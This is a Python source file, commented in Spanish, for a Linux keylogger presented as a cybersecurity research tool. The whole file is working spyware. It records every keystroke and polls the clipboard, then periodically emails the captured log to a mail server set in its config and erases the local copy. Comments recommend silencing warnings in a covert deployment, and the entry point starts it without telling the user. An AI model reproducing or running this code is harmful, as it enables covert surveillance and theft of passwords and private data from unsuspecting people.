# -*- coding: utf-8 -*-

"""
Keylogger con funciones avanzadas para investigaciones de ciberseguridad.

Este script implementa varias funcionalidades como
captura de teclas, monitoreo del portapapeles y exfiltración de datos por email.
"""
#----- INICIO DE IMPORTACIONES -----
import os
import threading
import time
import logging
import configparser
from datetime import datetime
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# NOTA: En un despliegue real/oculto, los siguientes prints (import pynput / import pyperclip) deberían reemplazarse 
# por logs internos o simplemente silenciarse para no alertar al usuario
try:
    from pynput import keyboard
except ImportError:
    print("[ADVERTENCIA] La librería 'pynput' no está instalada. El script no funcionará.")
    print("[ADVERTENCIA] Para instalar dependencias, ejecuta: 'pip install -r requirements.txt'")
    sys.exit(1)

# NOTA: Requiere tener instalado 'xclip' o 'xsel' en el sistema (sudo apt install xclip)
try:
    import pyperclip
except ImportError:
    print("[ADVERTENCIA] La librería 'pyperclip' no está instalada. El monitoreo del portapapeles estara desactivado.")
    print("[ADVERTENCIA] Para instalar dependencias, ejecuta: 'pip install -r requirements.txt'")
    pyperclip = None
#----- FIN DE IMPORTACIONES -----


class Keylogger:
    def __init__(self, config_file='config.ini'):      
        # Carga de Configuración
        self.config = configparser.ConfigParser()
        if not os.path.exists(config_file):
            raise FileNotFoundError(f"El archivo de configuración '{config_file}' no se encontró.")
        self.config.read(config_file)

        # Configuración del Logging
        log_filename = self.config.get('General', 'log_file', fallback='keylog.txt')
        logging.basicConfig(
            filename=log_filename,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        # Sistema de parada del script
        self.current_keys = set()
        # Paramos script con: Ctrl(Izq) + Alt(Izq) + S
        self.stop_combination = {
            keyboard.Key.ctrl_l, 
            keyboard.Key.alt_l, 
            keyboard.KeyCode(char='s')
        }

        self.last_clipboard_content = ""
        self.reporting_interval = self.config.getint('General', 'report_interval_seconds', fallback=300)
        self.timer = None
        self.os_type = self._detect_os()

    def _detect_os(self):
        # Detección del SO
        if sys.platform.startswith('linux'):
            return 'Linux'
        print(f"[ERROR DE SO] Sistema operativo no soportado: {sys.platform}")
        print("f[ERROR DE SO] Este keyloogger ha sido diseñado exclusivamente para Linux")
        sys.exit(1)

    def _on_press(self, key):
        self.current_keys.add(key)
        # Verificación parada de emergencia
        if self.stop_combination.issubset(self.current_keys):
            self.logger.warning("--- COMBINACIÓN DE PARADA DETECTADA (Ctrl+Alt+S) ---")
            self.logger.warning("--- DETENIENDO PROCESOS ---")
            
            if self.timer:
                self.timer.cancel()
            return False

        # Registro de teclas alfanuméricas y especiales
        try:
            self.logger.info(f"Tecla presionada: {key.char}")
        except AttributeError:
            self.logger.info(f"Tecla especial presionada: {key}")

    def _on_release(self, key):
        # Al soltar una tecla, la sacamos del conjunto
        try:
            self.current_keys.remove(key)
        except KeyError:
            pass 

    def _send_email_report(self):
        #Envía el contenido del log por email y lo limpia
        try:
            if not os.path.exists(self.config.get('General', 'log_file')):
                return
            with open(self.config.get('General', 'log_file'), 'r', encoding='utf-8') as f:
                log_content=f.read()            
            if not log_content.strip():
                return

            #Construcción del mensaje de email
            msg = MIMEMultipart()
            msg['From'] = self.config.get('Email', 'sender_email')
            msg['To'] = self.config.get('Email', 'receiver_email')
            msg['Subject'] = f"--- REPORTE DEL KEYLOGGER --- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            body = f"Datos capturados:\n\n{log_content}"
            msg.attach(MIMEText(body, 'plain'))

            #Conexión y envío
            server = smtplib.SMTP(self.config.get('Email', 'smtp_server'), self.config.getint('Email', 'smtp_port'))
            server.starttls()
            server.login(self.config.get('Email', 'sender_email'), self.config.get('Email', 'sender_password'))
            server.send_message(msg)
            server.quit()

            self.logger.info(f"[EMAIL] Enviado. Bytes: {len(log_content)}")
            open(self.config.get('General', 'log_file'), 'w').close()

        except Exception as e:
            self.logger.error(f"[ERROR EMAIL]Fallo al enviar el reporte: {e}")

    def _report_periodically(self):
        #Hilo para enviar reportes periodicamente
        self._send_email_report()
        self.timer = threading.Timer(self.reporting_interval, self._report_periodically)
        self.timer.daemon = True 
        self.timer.start()

    def _monitor_clipboard(self):
        #Hilo para revisar cambios en el portapapeles
        if not pyperclip: return
        while True:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != self.last_clipboard_content:
                    self.last_clipboard_content = current_clipboard
                    self.logger.info(f"PORTAPAPELES: '{current_clipboard}'")
            except Exception:
                 pass
            time.sleep(2) #Revisa si hay cambios cada 2seg

    def start(self):
        #Inicia todos los componentes del keylogger
        self.logger.warning("\n--- KEYLOGGER INICIADO ---")
        self.logger.info("Usa Ctrl+Alt+S para detener.")
        # Inicia monitoreo del portapapeles en un hilo separado 
        clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
        clipboard_thread.start()
        #Inicia el reporte periódico por email
        self._report_periodically()
        # Inicia el listener de teclado (bloquea el hilo principal)
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            listener.join()

if __name__ == "__main__":
    try:
        #Iniciamos sin avisar al usuario
        keylogger = Keylogger()
        keylogger.start()
    except FileNotFoundError as e:
        print(f"[ERROR CRÍTICO] Falta configuración: {e}")
    except KeyboardInterrupt:
        print("\n[AVISO] Interrupción manual.")
    except Exception as e:
        print(f"[ERROR INESPERADO] {e}")